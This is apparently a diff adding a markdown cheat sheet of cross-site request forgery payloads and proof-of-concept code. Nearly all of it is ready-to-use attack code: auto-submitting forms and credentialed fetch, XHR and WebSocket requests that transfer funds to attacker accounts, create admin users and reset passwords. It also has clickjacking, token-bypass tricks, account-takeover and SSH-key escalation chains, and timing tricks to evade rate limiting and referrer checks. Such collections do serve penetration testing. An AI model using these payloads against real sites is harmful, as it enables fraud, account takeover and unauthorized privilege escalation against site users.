@@ -1,0 +1,311 @@
+# CSRF Payloads & Proof of Concepts
+
+## GET-based CSRF Payloads
+
+### 1. **Simple Image Tag CSRF**
+```html
+<img src="https://vulnerable.com/transfer?amount=1000&to=attacker@evil.com" width="0" height="0" />
+```
+
+### 2. **Hidden Iframe CSRF**
+```html
+<iframe src="https://vulnerable.com/admin/delete-user?id=123" style="display:none;"></iframe>
+```
+
+### 3. **Redirect-based CSRF**
+```html
+<meta http-equiv="refresh" content="0; url=https://vulnerable.com/change-password?new=pwned123" />
+```
+
+## POST-based CSRF Payloads
+
+### 1. **Auto-submitting Form**
+```html
+<form action="https://vulnerable.com/transfer" method="POST" id="csrf_form">
+    <input type="hidden" name="amount" value="1000">
+    <input type="hidden" name="to_account" value="attacker_account">
+    <input type="hidden" name="csrf_token" value=""> <!-- Leave empty if not validated -->
+</form>
+<script>
+    document.getElementById('csrf_form').submit();
+</script>
+```
+
+### 2. **Multi-field Transfer Form**
+```html
+<form action="https://bank.vulnerable.com/transfer" method="POST">
+    <input type="hidden" name="recipient" value="attacker@evil.com">
+    <input type="hidden" name="amount" value="5000">
+    <input type="hidden" name="currency" value="USD">
+    <input type="hidden" name="pin" value=""> <!-- If PIN is optional -->
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+### 3. **Admin Action Form**
+```html
+<form action="https://admin.vulnerable.com/create-admin" method="POST">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="email" value="attacker@evil.com">
+    <input type="hidden" name="role" value="admin">
+    <input type="hidden" name="password" value="Admin@1234">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+## JSON/AJAX CSRF Payloads
+
+### 1. **API Endpoint Modification**
+```javascript
+fetch('https://api.vulnerable.com/user/settings', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    credentials: 'include',
+    body: JSON.stringify({
+        email: 'attacker@evil.com',
+        theme: 'dark',
+        notifications_enabled: false
+    })
+});
+```
+
+### 2. **API Account Takeover**
+```javascript
+fetch('https://vulnerable.com/api/v1/security/password', {
+    method: 'PUT',
+    headers: {'Content-Type': 'application/json'},
+    credentials: 'include',
+    body: JSON.stringify({
+        old_password: '',
+        new_password: 'AttackerPassword123!',
+        confirm_password: 'AttackerPassword123!'
+    })
+});
+```
+
+### 3. **API Profile Update**
+```javascript
+const payload = {
+    profile: {
+        bio: 'Hacked by attacker',
+        avatar_url: 'https://attacker.com/malware.exe',
+        phone: '+1234567890'
+    }
+};
+
+fetch('https://vulnerable.com/api/profile', {
+    method: 'PATCH',
+    body: JSON.stringify(payload),
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json'}
+});
+```
+
+## Subdomain/Cookie Scope CSRF
+
+### 1. **Cross-Subdomain CSRF**
+```html
+<!-- On attacker.suborgan.vulnerable.com -->
+<form action="https://api.vulnerable.com/transfer" method="POST">
+    <input type="hidden" name="amount" value="1000">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+## Advanced Payload Techniques
+
+### 1. **Polyglot CSRF (Works with multiple HTTP methods)**
+```html
+<form method="POST" action="https://vulnerable.com/action">
+    <input type="hidden" name="method" value="DELETE">
+    <input type="hidden" name="id" value="123">
+</form>
+```
+
+### 2. **CORS + CSRF Combo**
+```javascript
+// Exploit if CORS misconfigured
+const req = new XMLHttpRequest();
+req.open('POST', 'https://vulnerable.com/api/transfer', true);
+req.setRequestHeader('Content-Type', 'application/json');
+req.withCredentials = true;
+req.send(JSON.stringify({amount: 1000}));
+```
+
+### 3. **WebSocket CSRF**
+```javascript
+// Establish WebSocket connection from attacker domain
+const ws = new WebSocket('wss://vulnerable.com/ws');
+ws.onopen = () => {
+    ws.send(JSON.stringify({
+        action: 'transfer',
+        amount: 1000,
+        recipient: 'attacker'
+    }));
+};
+```
+
+## Social Engineering CSRF Vectors
+
+### 1. **Clickjacking + CSRF**
+```html
+<style>
+    #target {
+        position: absolute;
+        opacity: 0;
+        top: 100px;
+        left: 100px;
+    }
+</style>
+<button onclick="alert('You won a prize!')">Click here for FREE prize!</button>
+<iframe id="target" src="https://vulnerable.com/delete-account"></iframe>
+```
+
+### 2. **QR Code CSRF**
+```html
+<!-- Generate QR code containing CSRF payload URL -->
+<img src="https://qr-generator.com/qr?url=https://vulnerable.com/admin/create-user?email=attacker@evil.com" />
+```
+
+## CSRF Token Bypass Techniques
+
+### 1. **Empty Token Bypass**
+```html
+<!-- Try removing CSRF token -->
+<form action="https://vulnerable.com/transfer" method="POST">
+    <input type="hidden" name="amount" value="1000">
+    <!-- CSRF token field intentionally empty -->
+</form>
+```
+
+### 2. **Token Reuse**
+```javascript
+// Try reusing a captured token from another request
+const stolenToken = "abc123def456"; // Captured from previous request
+```
+
+### 3. **Token Parameter Pollution**
+```html
+<!-- Try multiple CSRF parameters -->
+<form action="https://vulnerable.com/transfer" method="POST">
+    <input name="csrf_token" value="">
+    <input name="_token" value="">
+    <input name="authenticity_token" value="">
+</form>
+```
+
+### 4. **HTTP Parameter Pollution**
+```
+POST /transfer HTTP/1.1
+Host: vulnerable.com
+
+amount=1000&csrf_token=valid&csrf_token=invalid&to=attacker
+```
+
+### 5. **Method Override Bypass**
+```html
+<form action="https://vulnerable.com/transfer" method="POST">
+    <input name="_method" value="DELETE">
+    <input type="hidden" name="amount" value="1000">
+</form>
+```
+
+## Multi-Step CSRF Chains
+
+### 1. **Account Takeover Chain**
+```
+Step 1: CSRF to change email
+POST /settings/email
+email=attacker@evil.com
+
+Step 2: CSRF to request password reset
+GET /request-password-reset?email=attacker@evil.com
+
+Step 3: Wait for email (sent to attacker)
+Follow password reset link
+
+Step 4: Take over account
+```
+
+### 2. **Privilege Escalation Chain**
+```
+Step 1: Update profile CSRF
+POST /user/profile
+role=user
+
+Step 2: CSRF to add SSH key
+POST /security/ssh-keys
+key=ssh-rsa AAAA...
+
+Step 3: Direct SSH access with attacker key
+```
+
+## Testing CSRF with Tools
+
+### 1. **Burp Suite - CSRF POC Generator**
+```
+Right-click request → Engagement Tools → Generate CSRF POC
+```
+
+### 2. **OWASP ZAP Payload**
+```
+[CSRF-Request]
+POST /transfer
+Content-Type: application/x-www-form-urlencoded
+
+amount=1000&to=attacker&csrf_token=
+```
+
+### 3. **Manual Testing Script**
+```bash
+#!/bin/bash
+# Test for CSRF vulnerability
+
+TARGET="https://vulnerable.com/transfer"
+AMOUNT="1000"
+
+# Create test HTML
+cat > csrf_test.html << EOF
+<html>
+<body>
+<form action="$TARGET" method="POST">
+    <input name="amount" value="$AMOUNT">
+    <input type="submit">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+EOF
+
+# Start simple HTTP server
+python3 -m http.server 8000
+```
+
+## Detection Bypass Techniques
+
+### 1. **Referrer Policy Bypass**
+```html
+<!-- Set referrer policy to hide origin -->
+<meta name="referrer" content="no-referrer">
+<form action="https://vulnerable.com/transfer" method="POST">
+    <input type="hidden" name="amount" value="1000">
+</form>
+```
+
+### 2. **Timing-based Attack**
+```javascript
+// Wait for user activity before executing
+setTimeout(() => {
+    fetch('https://vulnerable.com/action', {credentials: 'include', method: 'POST'});
+}, 5000);
+```
+
+### 3. **Low-and-Slow CSRF**
+```javascript
+// Distribute requests over time to evade rate limiting
+setInterval(() => {
+    fetch('https://vulnerable.com/action', {credentials: 'include'});
+}, 10000); // Every 10 seconds
+```
